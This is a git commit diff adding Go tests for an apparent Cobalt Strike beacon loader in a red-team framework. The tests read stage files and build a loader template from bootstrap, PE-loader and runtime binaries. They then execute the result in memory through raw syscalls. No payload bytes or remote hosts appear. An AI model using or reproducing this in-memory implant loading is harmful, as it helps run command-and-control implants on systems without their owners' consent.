e1d10c90022489a8844d8ff2ba9619951d6caa5d
For-ACGN <38399410+For-ACGN@users.noreply.github.com>
2026-09-05 12:23:54 +0800

    cs-beacon/instance_test.go: add TestInstance_Standard and TestInstance_Pipeline.

--- loader/cs-beacon/instance_test.go
+++ loader/cs-beacon/instance_test.go
@@ -1,13 +1,20 @@
 package beacon
 
 import (
+	"encoding/hex"
+	"fmt"
 	"os"
+	"runtime"
+	"strings"
 	"testing"
+	"time"
 
 	"github.com/stretchr/testify/require"
 
 	"github.com/RTS-Framework/GRT-Develop/argument"
+	"github.com/RTS-Framework/GRT-Develop/instance"
 	"github.com/RTS-Framework/GRT-MXLoader/loader"
+	"github.com/RTS-Framework/GRT-MXLoader/loader/xsyscall"
 )
 
 func TestCreateInstance(t *testing.T) {
@@ -133,4 +140,179 @@ func TestCreateInstance(t *testing.T) {
 		require.EqualError(t, err, errStr)
 		require.Nil(t, inst)
 	})
+}
+
+func TestInstance_Standard(t *testing.T) {
+	if runtime.GOOS != "windows" {
+		return
+	}
+
+	t.Run("x86", func(t *testing.T) {
+		if runtime.GOARCH != "386" {
+			return
+		}
+
+		t.Run("embed", func(t *testing.T) {
+			stage, err := os.ReadFile("testdata/stage_x86.dat")
+			require.NoError(t, err)
+			payload := loader.NewEmbed(stage, nil)
+
+			inst, err := CreateInstance("386", payload, nil)
+			require.NoError(t, err)
+
+			testLoadInstance(t, inst)
+		})
+
+		t.Run("file", func(t *testing.T) {
+			payload := loader.NewFile("testdata/stage_x86.dat")
+
+			inst, err := CreateInstance("386", payload, nil)
+			require.NoError(t, err)
+
+			testLoadInstance(t, inst)
+		})
+
+		t.Run("http", func(t *testing.T) {
+
+		})
+	})
+
+	t.Run("x64", func(t *testing.T) {
+		if runtime.GOARCH != "amd64" {
+			return
+		}
+
+		t.Run("embed", func(t *testing.T) {
+			stage, err := os.ReadFile("testdata/stage_x64.dat")
+			require.NoError(t, err)
+			payload := loader.NewEmbed(stage, nil)
+
+			inst, err := CreateInstance("amd64", payload, nil)
+			require.NoError(t, err)
+
+			testLoadInstance(t, inst)
+		})
+
+		t.Run("file", func(t *testing.T) {
+			payload := loader.NewFile("testdata/stage_x64.dat")
+
+			inst, err := CreateInstance("amd64", payload, nil)
+			require.NoError(t, err)
+
+			testLoadInstance(t, inst)
+		})
+
+		t.Run("http", func(t *testing.T) {
+
+		})
+	})
+}
+
+func TestInstance_Pipeline(t *testing.T) {
+	if runtime.GOOS != "windows" {
+		return
+	}
+
+	t.Run("x86", func(t *testing.T) {
+		if runtime.GOARCH != "386" {
+			return
+		}
+
+		stage, err := os.ReadFile("testdata/stage_x86.dat")
+		require.NoError(t, err)
+		payload := loader.NewEmbed(stage, nil)
+
+		opts := Options{
+			Template:       testBuildTemplate(t),
+			IgnoreInstOpts: true,
+		}
+
+		inst, err := CreateInstance("386", payload, &opts)
+		require.NoError(t, err)
+
+		testLoadInstance(t, inst)
+	})
+
+	t.Run("x64", func(t *testing.T) {
+		if runtime.GOARCH != "amd64" {
+			return
+		}
+
+		stage, err := os.ReadFile("testdata/stage_x64.dat")
+		require.NoError(t, err)
+		payload := loader.NewEmbed(stage, nil)
+
+		opts := Options{
+			Template:       testBuildTemplate(t),
+			IgnoreInstOpts: true,
+		}
+
+		inst, err := CreateInstance("amd64", payload, &opts)
+		require.NoError(t, err)
+
+		testLoadInstance(t, inst)
+	})
+}
+
+func testBuildTemplate(t *testing.T) []byte {
+	var (
+		boot []byte
+		ldr  []byte
+		rti  []byte
+		err  error
+	)
+	switch runtime.GOARCH {
+	case "386":
+		boot, err = os.ReadFile("../../dist/pipeline/CS_Beacon_x86.bin")
+		require.NoError(t, err)
+		ldr, err = os.ReadFile("../../asm/inst/pe_loader_x86.inst")
+		require.NoError(t, err)
+		rti, err = os.ReadFile("../../asm/inst/runtime_x86.inst")
+		require.NoError(t, err)
+	case "amd64":
+		boot, err = os.ReadFile("../../dist/pipeline/CS_Beacon_x64.bin")
+		require.NoError(t, err)
+		ldr, err = os.ReadFile("../../asm/inst/pe_loader_x64.inst")
+		require.NoError(t, err)
+		rti, err = os.ReadFile("../../asm/inst/runtime_x64.inst")
+		require.NoError(t, err)
+	default:
+		t.Fatal("unsupported architecture")
+	}
+	ldr = testInstToBin(t, ldr)
+	rti = testInstToBin(t, rti)
+
+	instOpts := instance.Options{
+		SkipArguments: true,
+	}
+	rti, err = instance.Instantiate(rti, &instOpts)
+	require.NoError(t, err)
+
+	template, err := loader.BuildTemplate(boot, ldr, rti)
+	require.NoError(t, err)
+	return template
+}
+
+func testInstToBin(t *testing.T, i []byte) []byte {
+	s := string(i)
+	s = strings.ReplaceAll(s, ",", "")
+	s = strings.ReplaceAll(s, " 0", "")
+	s = strings.ReplaceAll(s, "db", "")
+	s = strings.ReplaceAll(s, "h", "")
+	s = strings.ReplaceAll(s, " ", "")
+	s = strings.ReplaceAll(s, "\r\n", "")
+	bin, err := hex.DecodeString(s)
+	require.NoError(t, err)
+	return bin
+}
+
+func testLoadInstance(t *testing.T, inst []byte) {
+	now := time.Now()
+
+	addr := xsyscall.LoadInstance(t, inst)
+	ret, _, _ := xsyscall.SyscallN(addr, 0)
+	require.Zero(t, ret, fmt.Sprintf("0x%X", ret))
+
+	d := time.Since(now)
+	require.Greater(t, d, time.Second)
 }
